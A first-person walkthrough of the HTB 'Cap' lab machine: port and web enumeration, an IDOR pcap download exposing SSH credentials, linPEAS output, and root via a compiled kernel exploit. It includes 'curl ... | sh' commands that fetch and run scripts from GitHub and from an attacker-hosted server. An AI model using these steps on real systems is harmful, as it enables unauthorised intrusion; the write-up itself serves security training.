## Description
Cap is an easy difficulty Linux machine provided by HTB.

## Solution

### Service Scanning
I scanned the ports to identify the running services and the OS. Therefore I used 
`nmap`.  

```
> nmap 10.129.90.67 -sC -sV -p- -Pn

Starting Nmap 7.991 ( https://nmap.org ) at 2026-09-07 19:51 +0200
Nmap scan report for 10.129.90.67
Host is up (0.048s latency).
Not shown: 65532 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   3072 fa:80:a9:b2:ca:3b:88:69:a4:28:9e:39:0d:27:d5:75 (RSA)
|   256 96:d8:f8:e3:e8:f7:71:36:c5:49:d5:9d:b6:a4:c9:0c (ECDSA)
|_  256 3f:d0:ff:91:eb:3b:f6:e1:9f:2e:8d:de:b3:de:b2:18 (ED25519)
80/tcp open  http    Gunicorn
|_http-title: Security Dashboard
|_http-server-header: gunicorn
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 16.98 seconds
```
The target host OS is Linux.

These services are running on the following ports:
- Port 21: FTP service via `vsftpd` on version 3.0.3.
- Port 22: SSH service via `OpenSSH` on version 8.2p1
- Port 80: HTTP webserver via `gunicorn`, it seems to serve as a security dashboard.

### Attacking Network Services
I connected to the ftp service.
```
> ftp -p 10.129.90.67

Connected to 10.129.90.67.
220 (vsFTPd 3.0.3)
Name (10.129.90.67:tolga): anonymous
331 Please specify the password.
Password:
530 Login incorrect
```
The service asked me for a username and password. The anonymous user didn't work.

### Web Enumeration
I searched for hidden folders or directories with gobuster.
```
> gobuster dir -u http://10.129.90.67 -w /usr/share/SecLists/Discovery/Web-Content/common.txt

===============================================================
Gobuster v3.8.2
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.129.90.67
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/SecLists/Discovery/Web-Content/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.8.2
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
data                 (Status: 302) [Size: 208] [--> http://10.129.90.67/]
ip                   (Status: 200) [Size: 17460]
netstat              (Status: 200) [Size: 28503]
Progress: 4752 / 4752 (100.00%)
===============================================================
Finished
===============================================================
```
The endpoints /data, /ip, and /netstat have been found. The endpoint /data redirects to the homepage.
The content of ip:
```
eth0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 10.129.90.67  netmask 255.255.0.0  broadcast 10.129.255.255
        inet6 dead:beef::a0de:adff:fe88:879b  prefixlen 64  scopeid 0x0<global>
        inet6 fe80::a0de:adff:fe88:879b  prefixlen 64  scopeid 0x20<link>
        ether a2:de:ad:88:87:9b  txqueuelen 1000  (Ethernet)
        RX packets 596412  bytes 38787529 (38.7 MB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 155876  bytes 11986903 (11.9 MB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

lo: flags=73<UP,LOOPBACK,RUNNING>  mtu 65536
        inet 127.0.0.1  netmask 255.0.0.0
        inet6 ::1  prefixlen 128  scopeid 0x10<host>
        loop  txqueuelen 1000  (Local Loopback)
        RX packets 31393  bytes 2472407 (2.4 MB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 31393  bytes 2472407 (2.4 MB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
```
The content of /netstat:
```
Active Internet connections (servers and established)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       User       Inode      PID/Program name     Timer
tcp        0      0 0.0.0.0:80              0.0.0.0:*               LISTEN      1001       36931      -                    off (0.00/0/0)
tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      101        34758      -                    off (0.00/0/0)
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      0          36794      -                    off (0.00/0/0)
tcp        0      0 10.129.90.67:80         10.10.16.131:58708      FIN_WAIT2   0          0          -                    timewait (36.83/0/0)
tcp        0      0 10.129.90.67:80         10.10.16.131:58734      FIN_WAIT2   0          0          -                    timewait (36.94/0/0)
tcp        0      0 10.129.90.67:80         10.10.16.131:58004      FIN_WAIT2   0          0          -                    timewait (49.46/0/0)
tcp        0      0 10.129.90.67:80         10.10.16.131:58066      FIN_WAIT2   0          0          -                    timewait (49.51/0/0)
tcp        0      0 10.129.90.67:80         10.10.16.131:58046      FIN_WAIT2   0          0          -                    timewait (49.44/0/0)
tcp        0      0 10.129.90.67:80         10.10.16.131:58054      FIN_WAIT2   0          0          -                    timewait (49.46/0/0)
tcp        0      0 10.129.90.67:80         10.10.16.131:58032      FIN_WAIT2   0          0          -                    timewait (49.33/0/0)
tcp        0      0 10.129.90.67:80         10.10.16.131:58002      FIN_WAIT2   0          0          -                    timewait (49.38/0/0)
tcp        0      0 10.129.90.67:80         10.10.16.131:58056      FIN_WAIT2   0          0          -                    timewait (49.51/0/0)
tcp        0      0 10.129.90.67:80         10.10.16.131:58742      FIN_WAIT2   0          0          -                    timewait (36.67/0/0)
tcp        0      1 10.129.90.67:51504      1.1.1.1:53              SYN_SENT    101        92984      -                    on (7.26/3/0)
tcp        0      0 10.129.90.67:80         10.10.16.131:58700      FIN_WAIT2   0          0          -                    timewait (36.94/0/0)
tcp        0      0 10.129.90.67:80         10.10.16.131:58016      FIN_WAIT2   0          0          -                    timewait (49.46/0/0)
tcp        0      0 10.129.90.67:80         10.10.16.131:32968      ESTABLISHED 1001       93915      -                    off (0.00/0/0)
tcp        0      0 10.129.90.67:80         10.10.16.131:58722      FIN_WAIT2   0          0          -                    timewait (36.89/0/0)
tcp        0      0 10.129.90.67:80         10.10.16.131:58686      FIN_WAIT2   0          0          -                    timewait (36.73/0/0)
tcp        0      0 10.129.90.67:80         10.10.16.131:58674      FIN_WAIT2   0          0          -                    timewait (37.85/0/0)
tcp6       0      0 :::21                   :::*                    LISTEN      0          35434      -                    off (0.00/0/0)
tcp6       0      0 :::22                   :::*                    LISTEN      0          36805      -                    off (0.00/0/0)
udp        0      0 127.0.0.53:53           0.0.0.0:*                           101        34757      -                    off (0.00/0/0)
udp        0      0 0.0.0.0:68              0.0.0.0:*                           0          34375      -                    off (0.00/0/0)
udp        0      0 127.0.0.1:43447         127.0.0.53:53           ESTABLISHED 102        92983      -                    off (0.00/0/0)
Active UNIX domain sockets (servers and established)
Proto RefCnt Flags       Type       State         I-Node   PID/Program name     Path
unix  2      [ ACC ]     SEQPACKET  LISTENING     27762    -                    /run/udev/control
unix  2      [ ACC ]     STREAM     LISTENING     27746    -                    @/org/kernel/linux/storage/multipathd
unix  3      [ ]         DGRAM                    27730    -                    /run/systemd/notify
unix  2      [ ACC ]     STREAM     LISTENING     27733    -                    /run/systemd/private
unix  2      [ ACC ]     STREAM     LISTENING     27735    -                    /run/systemd/userdb/io.systemd.DynamicUser
unix  2      [ ACC ]     STREAM     LISTENING     27744    -                    /run/lvm/lvmpolld.socket
unix  2      [ ]         DGRAM                    27747    -                    /run/systemd/journal/syslog
unix  7      [ ]         DGRAM                    27755    -                    /run/systemd/journal/dev-log
unix  2      [ ACC ]     STREAM     LISTENING     27757    -                    /run/systemd/journal/stdout
unix  8      [ ]         DGRAM                    27759    -                    /run/systemd/journal/socket
unix  2      [ ACC ]     STREAM     LISTENING     27922    -                    /run/systemd/journal/io.systemd.journal
unix  2      [ ACC ]     STREAM     LISTENING     32269    -                    /run/dbus/system_bus_socket
unix  2      [ ACC ]     STREAM     LISTENING     32280    -                    /run/snapd.socket
unix  2      [ ACC ]     STREAM     LISTENING     32282    -                    /run/snapd-snap.socket
unix  2      [ ACC ]     STREAM     LISTENING     32284    -                    /run/uuidd/request
unix  2      [ ACC ]     STREAM     LISTENING     32490    -                    /run/irqbalance//irqbalance1004.sock
unix  2      [ ACC ]     STREAM     LISTENING     32493    -                    /var/run/vmware/guestServicePipe
unix  2      [ ACC ]     STREAM     LISTENING     32272    -                    @ISCSIADM_ABSTRACT_NAMESPACE
unix  2      [ ACC ]     STREAM     LISTENING     32273    -                    /var/snap/lxd/common/lxd/unix.socket
unix  3      [ ]         STREAM     CONNECTED     32833    -                    /run/systemd/journal/stdout
unix  2      [ ]         DGRAM                    27544    -                    
unix  2      [ ]         DGRAM                    32146    -                    
unix  2      [ ]         DGRAM                    32137    -                    
unix  3      [ ]         STREAM     CONNECTED     34941    -                    
unix  3      [ ]         DGRAM                    32140    -                    
unix  3      [ ]         STREAM     CONNECTED     34587    -                    
unix  3      [ ]         STREAM     CONNECTED     32298    -                    
unix  3      [ ]         STREAM     CONNECTED     36411    -                    
unix  3      [ ]         STREAM     CONNECTED     28217    -                    /run/systemd/journal/stdout
unix  2      [ ]         DGRAM                    34741    -                    
unix  3      [ ]         STREAM     CONNECTED     34589    -                    /run/dbus/system_bus_socket
unix  3      [ ]         STREAM     CONNECTED     29494    -                    /run/systemd/journal/stdout
unix  3      [ ]         STREAM     CONNECTED     34756    -                    
unix  3      [ ]         STREAM     CONNECTED     34835    -                    /run/dbus/system_bus_socket
unix  3      [ ]         STREAM     CONNECTED     33932    -                    /run/systemd/journal/stdout
unix  3      [ ]         STREAM     CONNECTED     34691    -                    
unix  3      [ ]         STREAM     CONNECTED     32465    -                    
unix  3      [ ]         STREAM     CONNECTED     36412    -                    /run/systemd/journal/stdout
unix  3      [ ]         DGRAM                    32141    -                    
unix  3      [ ]         DGRAM                    32143    -                    
unix  3      [ ]         STREAM     CONNECTED     35224    -                    
unix  3      [ ]         STREAM     CONNECTED     32275    -                    
unix  2      [ ]         DGRAM                    34585    -                    
unix  3      [ ]         STREAM     CONNECTED     34834    -                    
unix  3      [ ]         STREAM     CONNECTED     35412    13253/sh             
unix  3      [ ]         STREAM     CONNECTED     31305    -                    /run/systemd/journal/stdout
unix  3      [ ]         STREAM     CONNECTED     35034    -                    /run/dbus/system_bus_socket
unix  3      [ ]         STREAM     CONNECTED     31037    -                    /run/systemd/journal/stdout
unix  2      [ ]         DGRAM                    39003    -                    
unix  3      [ ]         STREAM     CONNECTED     31900    -                    
unix  3      [ ]         STREAM     CONNECTED     34586    -                    
unix  3      [ ]         STREAM     CONNECTED     34721    -                    /run/systemd/journal/stdout
unix  3      [ ]         DGRAM                    32142    -                    
unix  2      [ ]         DGRAM                    36059    -                    
unix  3      [ ]         STREAM     CONNECTED     30278    -                    
unix  3      [ ]         STREAM     CONNECTED     34692    -                    
unix  3      [ ]         STREAM     CONNECTED     34591    -                    /run/dbus/system_bus_socket
unix  3      [ ]         STREAM     CONNECTED     34094    -                    /run/systemd/journal/stdout
unix  3      [ ]         STREAM     CONNECTED     36057    -                    /run/systemd/journal/stdout
unix  3      [ ]         STREAM     CONNECTED     32131    -                    
unix  3      [ ]         DGRAM                    28319    -                    
unix  3      [ ]         STREAM     CONNECTED     34091    -                    
unix  3      [ ]         DGRAM                    27525    -                    
unix  3      [ ]         STREAM     CONNECTED     34646    -                    
unix  3      [ ]         STREAM     CONNECTED     34090    -                    
unix  3      [ ]         STREAM     CONNECTED     34095    -                    /run/systemd/journal/stdout
unix  3      [ ]         DGRAM                    27524    -                    
unix  3      [ ]         DGRAM                    28318    -                    
unix  3      [ ]         STREAM     CONNECTED     33931    -                    
unix  2      [ ]         DGRAM                    32267    -                    
unix  3      [ ]         STREAM     CONNECTED     32274    -                    
unix  3      [ ]         DGRAM                    27732    -                    
unix  3      [ ]         STREAM     CONNECTED     34588    -                    /run/dbus/system_bus_socket
unix  3      [ ]         STREAM     CONNECTED     34647    -                    /run/dbus/system_bus_socket
unix  3      [ ]         STREAM     CONNECTED     28331    -                    /run/systemd/journal/stdout
unix  3      [ ]         STREAM     CONNECTED     28088    -                    
unix  3      [ ]         STREAM     CONNECTED     34604    -                    /run/dbus/system_bus_socket
unix  2      [ ]         DGRAM                    27926    -                    
unix  3      [ ]         STREAM     CONNECTED     31738    -                    /run/systemd/journal/stdout
unix  3      [ ]         DGRAM                    28317    -                    
unix  2      [ ]         DGRAM                    34597    -                    
unix  2      [ ]         DGRAM                    32512    -                    
unix  3      [ ]         STREAM     CONNECTED     31302    -                    
unix  3      [ ]         STREAM     CONNECTED     32831    -                    
unix  3      [ ]         STREAM     CONNECTED     34603    -                    
unix  3      [ ]         STREAM     CONNECTED     34592    -                    /run/dbus/system_bus_socket
unix  3      [ ]         DGRAM                    27731    -                    
unix  3      [ ]         STREAM     CONNECTED     31734    -                    
unix  3      [ ]         STREAM     CONNECTED     31303    -                    /run/systemd/journal/stdout
unix  3      [ ]         STREAM     CONNECTED     36793    -                    /run/systemd/journal/stdout
unix  3      [ ]         DGRAM                    28316    -                    
unix  3      [ ]         STREAM     CONNECTED     28306    -                    
unix  3      [ ]         STREAM     CONNECTED     36786    -                    
unix  3      [ ]         STREAM     CONNECTED     36586    -                    /run/systemd/journal/stdout
unix  3      [ ]         STREAM     CONNECTED     32473    -                    
unix  3      [ ]         STREAM     CONNECTED     34092    -                    /run/systemd/journal/stdout
unix  2      [ ]         DGRAM                    28312    -                    
unix  2      [ ]         DGRAM                    27522    -
```
The content wasn't interesting for me but I entered the `/ip` website and I found a link to "http://10.129.90.67/data/1". On the website the number of packets is listed and a download button is available. After pressing the button I downloaded a file which is named "1.pcap". PCAP files store raw network communication data. I analysed the file with Wireshark.
After observing the file I found network traffic in it but no data which is of use.
### Exploitation: Lateral Movement (User: nathan)
The file "1.pcap" led me to the suspicion, that there are more files which are stored numbered. I tested the server for an IDOR vulnerability by requesting the 0.pcap file. If a file with this name is stored in the same folder as 1.pcap and the server doesn't request any authorization for this file, then I can download it with "http://10.129.90.67/download/0".
I requested "http://10.129.90.67/download/0", downloaded the file 0.pcap, opened it in Wireshark and found some credentials. 
- Username: nathan
- Password: [REDACTED PASSWORD]

I connected to the server via SSH and used the credentials of the user nathan.
```
> ssh nathan@10.129.90.67
password: [REDACTED PASSWORD]

Welcome to Ubuntu 20.04.2 LTS (GNU/Linux 5.4.0-80-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Mon Sep  7 19:46:59 UTC 2026

  System load:           0.0
  Usage of /:            36.9% of 8.73GB
  Memory usage:          24%
  Swap usage:            0%
  Processes:             228
  Users logged in:       0
  IPv4 address for eth0: 10.129.90.67
  IPv6 address for eth0: dead:beef::a0de:adff:fe88:879b

  => There are 4 zombie processes.


63 updates can be applied immediately.
42 of these updates are standard security updates.
To see these additional updates run: apt list --upgradable


The list of available updates is more than a week old.
To check for new updates run: sudo apt update

Last login: Thu May 27 11:21:27 2021 from 10.10.14.7
```

Afterwards I grabbed the user flag:
```
> ls -la

total 28
drwxr-xr-x 3 nathan nathan 4096 May 27  2021 .
drwxr-xr-x 3 root   root   4096 May 23  2021 ..
lrwxrwxrwx 1 root   root      9 May 15  2021 .bash_history -> /dev/null
-rw-r--r-- 1 nathan nathan  220 Feb 25  2020 .bash_logout
-rw-r--r-- 1 nathan nathan 3771 Feb 25  2020 .bashrc
drwx------ 2 nathan nathan 4096 May 23  2021 .cache
-rw-r--r-- 1 nathan nathan  807 Feb 25  2020 .profile
lrwxrwxrwx 1 root   root      9 May 27  2021 .viminfo -> /dev/null
-r-------- 1 nathan nathan   33 Sep  7 10:42 user.txt

> cat user.txt
[REDACTED FLAG]
```
### Host enumeration
After successfully grabbing the flag I scanned the server with linPEAS.
Therefore I needed to upload linPEAS first.
```
curl -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh | sh
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
  0     0    0     0    0     0      0      0 --:--:--  0:00:04 --:--:--     0curl: (6) Could not resolve host: github.com
```
The server wouldn't load linPEAS directly from GitHub. I started a local http server and uploaded the linPEAS file from my machine:

Attacker:
```
> sudo python3 -m http.server 80 --bind 10.10.16.131

Serving HTTP on 10.10.16.131 port 80 (http://10.10.16.131:80/) ...
10.129.90.67 - - [07/Sep/2026 22:35:38] "GET / HTTP/1.1" 200 -
```

Victim:
```
> curl 10.10.16.131/linpeas.sh | sh
```
What linPEAS found:
```
╔══════════╣ Environment (T1082,T1552.007)
╚ Any private information inside environment variables?
LESSOPEN=| /usr/bin/lesspipe %s
USER=nathan
SSH_CLIENT=10.10.16.131 36760 22
SHLVL=0
MOTD_SHOWN=pam
HOME=/home/nathan
OLDPWD=/
SSH_TTY=/dev/pts/0
LOGNAME=nathan
_=/usr/bin/sh
TERM=xterm-256color
XDG_RUNTIME_DIR=/run/user/1001
LANG=C.UTF-8
SHELL=/bin/bash
LESSCLOSE=/usr/bin/lesspipe %s %s
PWD=/home/nathan
SSH_CONNECTION=10.10.16.131 36760 10.129.90.67 22
XDG_DATA_DIRS=/usr/local/share:/usr/share:/var/lib/snapd/desktop

╔══════════╣ Kernel Exploit Registry (T1068)
═╣ Operating system ............. Linux
═╣ Kernel release ............... 5.4.0-80-generic
═╣ Comparable version ........... 5.4.0.80
═╣ Data chunk limit ............. max 25 rows per KERNEL_CVE_DATA_* variable (1..24)
═╣ Kernel config source ......... /boot/config-5.4.0-80-generic
CVE: CVE-2021-3493 | Name: Ubuntu OverlayFS | Match data: pkg=linux-kernel,ver>=3.13,ver<5.14,x86_64 | Tags: ubuntu=(14.04|16.04|18.04|20.04|20.10) | Rank: 1 | Details: Only Ubuntu is affected.
CVE: CVE-2021-22555 | Name: Netfilter heap out-of-bounds write | Match data: pkg=linux-kernel,ver>=2.6.19,ver<=5.12-rc6 | Tags: ubuntu=20.04{kernel:5.8.0-*} | Rank: 1 | Details: ip_tables kernel module must be loaded
CVE: CVE-2022-32250 | Name: nft_object UAF (NFT_MSG_NEWSET) | Match data: pkg=linux-kernel,ver<5.18.1,CONFIG_USER_NS=y,sysctl:kernel.unprivileged_userns_clone==1 | Tags: ubuntu=(22.04){kernel:5.15.0-27-generic} | Rank: 1 | Details: kernel.unprivileged_userns_clone=1 required (to obtain CAP_NET_ADMIN)
CVE: CVE-2026-43503 | Name: DirtyClone | Match data: pkg=linux-kernel,ver>=3.9,ver<5.10.257 | Tags: 1 | Rank: Fixed in stable 5.10.257; exploit path is in the networking stack and may be mitigated by removing the relevant ESP modules
CVE: CVE-2026-46333 | Name: ptrace exit-race | Match data: pkg=linux-kernel,ver>=4.10,ver<5.10.256,cmd:[ "$(cat /proc/sys/kernel/yama/ptrace_scope 2>/dev/null || echo 0)" -lt 2 ] | Tags: 1 | Rank: Upstream issue introduced in 4.10; fixed in 5.10.256; mitigated by kernel.yama.ptrace_scope >= 2
CVE: CVE-2026-43499 | Name: GhostLock rtmutex UAF | Match data: pkg=linux-kernel,ver>=2.6.39,ver<5.10.261,CONFIG_FUTEX_PI=y | Tags: 1 | Rank: Fixed in stable 5.10.261; priority-inheritance futexes must be enabled
═╣ Kernel vulns found: 6


╔══════════╣ Checking for Dirty Frag (CVE-2026-43284 / CVE-2026-43500) (T1068)
╚ https://ubuntu.com/blog/dirty-frag-linux-vulnerability-fixes-available
╚ https://www.cve.org/CVERecord?id=CVE-2026-43284
╚ https://www.cve.org/CVERecord?id=CVE-2026-43500
CVE-2026-43284 (xfrm-ESP): autoloadable: esp4 esp6 xfrm_user ipcomp6
CVE-2026-43500 (rxrpc): autoloadable: rxrpc
modprobe mitigation (xfrm-ESP): not found
modprobe mitigation (rxrpc): not found
Unprivileged user namespaces: enabled
Kernel build predates upstream fix (2026-05-08): likely unpatched unless distro backport.
LIKELY VULNERABLE to CVE-2026-43284 (xfrm-ESP).
LIKELY VULNERABLE to CVE-2026-43500 (rxrpc).
Mitigation: 'install esp4/esp6/rxrpc /bin/false' in /etc/modprobe.d/, then rmmod;
or sysctl kernel.unprivileged_userns_clone=0; or apply distro patches.


══╣ Polkit Binary (T1548.003,T1068)
Pkexec binary found at: /usr/bin/pkexec
Pkexec binary has SUID bit set!
-rwsr-xr-x 1 root root 31032 Aug 16  2019 /usr/bin/pkexec
pkexec version 0.105
Potentially vulnerable to CVE-2021-4034 (PwnKit) - check distro patches


╔══════════╣ Analyzing PAM Auth Files (limit 70)
drwxr-xr-x 2 root root 4096 May 31  2021 /etc/pam.d
-rw-r--r-- 1 root root 2133 May 29  2020 /etc/pam.d/sshd
account    required     pam_nologin.so
session [success=ok ignore=ignore module_unknown=ignore default=bad]        pam_selinux.so close
session    required     pam_loginuid.so
session    optional     pam_keyinit.so force revoke
session    optional     pam_motd.so  motd=/run/motd.dynamic
session    optional     pam_motd.so noupdate
session    optional     pam_mail.so standard noenv # [1]
session    required     pam_limits.so
session    required     pam_env.so # [1]
session    required     pam_env.so user_readenv=1 envfile=/etc/default/locale
session [success=ok ignore=ignore module_unknown=ignore default=bad]        pam_selinux.so open

drwxr-xr-x 2 root root 4096 May 31  2021 /etc/pam.d
-rw-r--r-- 1 root root 2133 May 29  2020 /etc/pam.d/sshd
-rw-r--r-- 1 root root 1435 May 31  2021 /etc/pam.d/common-session-noninteractive
session	[default=1]			pam_permit.so
session	required			pam_permit.so
-rw-r--r-- 1 root root 4126 Apr 16  2020 /etc/pam.d/login
-rw-r--r-- 1 root root 92 Feb  7  2020 /etc/pam.d/passwd
-rw-r--r-- 1 root root 92 Feb  7  2020 /etc/pam.d/chpasswd
-rw-r--r-- 1 root root 143 Jul 28  2019 /etc/pam.d/runuser
auth		sufficient	pam_rootok.so
-rw-r--r-- 1 root root 384 Feb  7  2020 /etc/pam.d/chfn
auth		sufficient	pam_rootok.so
-rw-r--r-- 1 root root 1249 May 31  2021 /etc/pam.d/common-auth
auth	[success=1 default=ignore]	pam_unix.so nullok_secure
auth	required			pam_permit.so
-rw-r--r-- 1 root root 319 May  7  2014 /etc/pam.d/vsftpd
-rw-r--r-- 1 root root 137 Jul 28  2019 /etc/pam.d/su-l
-rw-r--r-- 1 root root 270 Aug 16  2019 /etc/pam.d/polkit-1
-rw-r--r-- 1 root root 1440 May 31  2021 /etc/pam.d/common-password
password	required			pam_permit.so
-rw-r--r-- 1 root root 239 Feb  3  2020 /etc/pam.d/sudo
-rw-r--r-- 1 root root 92 Feb  7  2020 /etc/pam.d/newusers
-rw-r--r-- 1 root root 1208 May 31  2021 /etc/pam.d/common-account
account	required			pam_permit.so
-rw-r--r-- 1 root root 138 Jul 28  2019 /etc/pam.d/runuser-l
-rw-r--r-- 1 root root 606 Feb 11  2020 /etc/pam.d/cron
-rw-r--r-- 1 root root 581 Feb  7  2020 /etc/pam.d/chsh
auth		sufficient	pam_rootok.so
-rw-r--r-- 1 root root 520 Dec 17  2019 /etc/pam.d/other
-rw-r--r-- 1 root root 119 Mar  9  2020 /etc/pam.d/vmtoolsd
-rw-r--r-- 1 root root 2257 Jul 28  2019 /etc/pam.d/su
auth       sufficient pam_rootok.so
-rw-r--r-- 1 root root 250 Jul 24  2018 /etc/pam.d/atd
-rw-r--r-- 1 root root 1470 May 31  2021 /etc/pam.d/common-session
session	[default=1]			pam_permit.so
session	required			pam_permit.so
-rw-r--r-- 1 root root 317 Apr 22  2020 /etc/pam.d/systemd-user


╔══════════╣ Analyzing Ldap Files (limit 70)
The password hash is from the {SSHA} to 'structural'
drwxr-xr-x 2 root root 4096 May 23  2021 /etc/ldap

drwxr-xr-x 2 root root 32 May  7  2021 /snap/core18/2066/etc/ldap

drwxr-xr-x 2 root root 32 Jun 11  2021 /snap/core18/2074/etc/ldap


╔══════════╣ Analyzing Cloud Init Files (limit 70)
-rw-r--r-- 1 root root 3559 Apr 19  2021 /snap/core18/2066/etc/cloud/cloud.cfg
     lock_passwd: True
-rw-r--r-- 1 root root 3559 May 11  2021 /snap/core18/2074/etc/cloud/cloud.cfg
     lock_passwd: True

╔══════════╣ Analyzing Keyring Files (limit 70)
drwxr-xr-x 2 root root 200 May  7  2021 /snap/core18/2066/usr/share/keyrings
drwxr-xr-x 2 root root 200 Jun 11  2021 /snap/core18/2074/usr/share/keyrings
drwxr-xr-x 2 root root 4096 May 23  2021 /usr/share/keyrings


╔══════════╣ Analyzing Proxy Config Files (limit 70)
-rw-r--r-- 1 root root 106 May 23  2021 /etc/environment


╔══════════╣ Searching uncommon passwd files (splunk) (T1552.001)
passwd file: /etc/pam.d/passwd
passwd file: /etc/passwd
passwd file: /snap/core18/2066/etc/pam.d/passwd
passwd file: /snap/core18/2066/etc/passwd
passwd file: /snap/core18/2066/usr/share/bash-completion/completions/passwd
passwd file: /snap/core18/2066/usr/share/lintian/overrides/passwd
passwd file: /snap/core18/2066/var/lib/extrausers/passwd
passwd file: /snap/core18/2074/etc/pam.d/passwd
passwd file: /snap/core18/2074/etc/passwd
passwd file: /snap/core18/2074/usr/share/bash-completion/completions/passwd
passwd file: /snap/core18/2074/usr/share/lintian/overrides/passwd
passwd file: /snap/core18/2074/var/lib/extrausers/passwd
passwd file: /usr/share/bash-completion/completions/passwd
passwd file: /usr/share/lintian/overrides/passwd


╔══════════╣ Searching ssl/ssh files (T1552.004,T1021.004)
╔══════════╣ Analyzing SSH Files (limit 70)
-rw-r--r-- 1 root root 598 Sep 23  2020 /etc/ssh/ssh_host_dsa_key.pub
-rw-r--r-- 1 root root 170 Sep 23  2020 /etc/ssh/ssh_host_ecdsa_key.pub
-rw-r--r-- 1 root root 90 Sep 23  2020 /etc/ssh/ssh_host_ed25519_key.pub
-rw-r--r-- 1 root root 562 Sep 23  2020 /etc/ssh/ssh_host_rsa_key.pub

PermitRootLogin yes
```

LinPEAS found 2 possible dirty frag vulnerabilities [CVE-2026-43284](https://nvd.nist.gov/vuln/detail/cve-2026-43284) and [CVE-2026-43500](https://nvd.nist.gov/vuln/detail/cve-2026-43500). At first I tried [CVE-2026-43284](https://nvd.nist.gov/vuln/detail/cve-2026-43284) which may result in local privilege escalation.
### Exploitation: Privilege Escalation (User: root)
I followed the steps and used the C file from [here](https://github.com/0xBlackash/CVE-2026-43284).
```
nathan@cap:~$ nano CVE-2026-43284.c
nathan@cap:~$ gcc CVE-2026-43284.c -o CVE-2026-43284 -Wall -O2
nathan@cap:~$ gcc CVE-2026-43284.c -o CVE-2026-43284 -static -s -O3
nathan@cap:~$ ./CVE-2026-43284
# ^C
# sdf
sh: 1: sdf: not found
# whoami
root
# ls /root
root.txt  snap
# sudo cat /root/root.txt
[REDACTED FLAG]
```
At first I tried to quit the program because I thought that it was stuck in an infinite loop, after typing in "sdf" I saw the notification that "sdf" has not been found and that `sh` tried to execute my command. Afterwards I asked the OS which user I am and it showed me that I was root. Afterwards I listed the contents of the root directory and printed my flag.